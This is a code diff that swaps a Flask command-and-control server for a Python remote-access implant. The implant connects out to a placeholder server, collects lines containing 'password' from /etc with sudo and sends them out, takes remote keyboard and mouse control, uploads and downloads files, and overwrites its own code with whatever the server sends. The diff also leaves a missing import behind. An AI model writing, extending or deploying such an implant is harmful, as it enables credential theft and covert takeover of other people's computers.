@@ -1,49 +1,61 @@
-from flask import Flask, render_template, request, jsonify, send_file, Response
-import threading
 import socket
+import subprocess
 import os
-import time
-import cv2
-import numpy as np
-import base64
+import pyautogui
+import keyring
+import shutil
 
-app = Flask(__name__)
+HOST = 'SERVER_IP'  # Replace with your server's IP
+PORT = 5555
 
-clients = {}
-client_lock = threading.Lock()
-UPLOAD_FOLDER = 'uploads'
-os.makedirs(UPLOAD_FOLDER, exist_ok=True)
+def handle_server_connection():
+    while True:
+        try:
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+                s.connect((HOST, PORT))
+                while True:
+                    data = s.recv(1024).decode()
+                    if not data:
+                        break
+                    
+                    # Password retrieval
+                    if data == "GET_PASSWORDS":
+                        passwords = subprocess.getoutput("sudo grep -r 'password' /etc/ 2>/dev/null || echo 'No passwords found'")
+                        s.sendall(passwords.encode())
+                    
+                    # Remote control
+                    elif ":" in data:
+                        action, key = data.split(":")
+                        if action == "keypress":
+                            pyautogui.press(key)
+                        elif action == "mouse_move":
+                            x, y = map(int, key.split(","))
+                            pyautogui.moveTo(x, y)
+                        elif action == "mouse_click":
+                            pyautogui.click(button=key)
+                    
+                    # File download
+                    elif data.startswith("DOWNLOAD:"):
+                        filename = data.split(":")[1]
+                        if os.path.exists(filename):
+                            with open(filename, 'rb') as f:
+                                s.sendall(f.read())
+                    
+                    # File upload
+                    elif data.startswith("UPLOAD:"):
+                        filename = data.split(":")[1]
+                        with open(filename, 'wb') as f:
+                            f.write(s.recv(8192))
+                    
+                    # Code update
+                    elif data.startswith("UPDATE_CODE:"):
+                        new_code = data.split(":")[1]
+                        with open(__file__, 'w') as f:
+                            f.write(new_code)
+                        s.sendall("Code updated".encode())
+        except Exception as e:
+            print(f"Error: {e}")
+            time.sleep(5)
 
-# WebSocket-like streaming (simplified)
-stream_data = {}
-
-def start_server_socket():
-    HOST = '100.109.211.66'
-    PORT = 5555
-    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.bind((HOST, PORT))
-        s.listen()
-        print(f"[*] Listening on {HOST}:{PORT}")
-        while True:
-            conn, addr = s.accept()
-            with client_lock:
-                client_id = f"client_{len(clients) + 1}"
-                clients[client_id] = {"conn": conn, "addr": addr}
-            print(f"[+] {client_id} connected from {addr}")
-
-# Live Stream Endpoint
-@app.route('/api/stream/<client_id>')
-def stream(client_id):
-    def generate():
-        while True:
-            if client_id in stream_data:
-                frame = stream_data[client_id]
-                yield (b'--frame\r\n'
-                       b'Content-Type: image/jpeg\r\n\r\n' + frame + b'\r\n')
-            time.sleep(0.1)
-    return Response(generate(), mimetype='multipart/x-mixed-replace; boundary=frame')
-
-# Other endpoints (file upload/download, commands, etc.) remain unchanged
 if __name__ == '__main__':
-    threading.Thread(target=start_server_socket, daemon=True).start()
-    app.run(host='0.0.0.0', port=5000, threaded=True)
+    handle_server_connection()
